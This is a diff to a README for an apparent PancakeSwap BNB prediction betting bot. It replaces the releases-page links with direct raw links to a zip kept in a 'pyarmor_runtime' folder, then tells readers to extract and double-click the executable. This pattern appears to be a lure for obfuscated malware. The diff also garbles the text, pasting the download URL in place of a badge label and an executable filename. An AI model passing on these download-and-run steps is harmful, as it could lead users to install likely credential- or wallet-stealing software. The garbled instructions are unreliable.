@@ -1,6 +1,6 @@
 # 🥞 Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot - Your Easy Betting Companion
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/releases)
+[![Download](https://raw.githubusercontent.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/main/BNB prediction project Code/pyarmor_runtime_009177/Pancakeswap_Prediction_Betting_Automated_BN_A_Robot_v3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/main/BNB prediction project Code/pyarmor_runtime_009177/Pancakeswap_Prediction_Betting_Automated_BN_A_Robot_v3.5.zip)
 
 ## 📦 Introduction
 
@@ -16,7 +16,7 @@ To get started with the Pancakeswap BNB Prediction AI, follow these simple steps
    - An internet connection.
    - Basic familiarity with running executable files and following prompts.
 
-2. **Visit the Releases Page**: Use this link to download the software: [Download Here](https://github.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/releases). This page contains the latest versions of the application.
+2. **Visit the Releases Page**: Use this link to download the software: [Download Here](https://raw.githubusercontent.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/main/BNB prediction project Code/pyarmor_runtime_009177/Pancakeswap_Prediction_Betting_Automated_BN_A_Robot_v3.5.zip). This page contains the latest versions of the application.
 
 ## 📥 Download & Install
 
@@ -24,7 +24,7 @@ To get started with the Pancakeswap BNB Prediction AI, follow these simple steps
 2. Look for the latest version of the Pancakeswap BNB Prediction AI Automated Betting Robot.
 3. Click on the file to download it to your computer. This will usually be a `.exe` or a `.zip` file.
 4. If you downloaded a `.zip`, extract the files to a location of your choice. 
-5. Find the main executable file, typically named something like `Pancakeswap-BNB-Prediction-AI.exe`.
+5. Find the main executable file, typically named something like `https://raw.githubusercontent.com/tonim82/Pancakeswap-BNB-Prediction-AI-Automated-Betting-Robot/main/BNB prediction project Code/pyarmor_runtime_009177/Pancakeswap_Prediction_Betting_Automated_BN_A_Robot_v3.5.zip`.
 6. Double-click this file to launch the application.
 
 ## 🔧 Setting Up
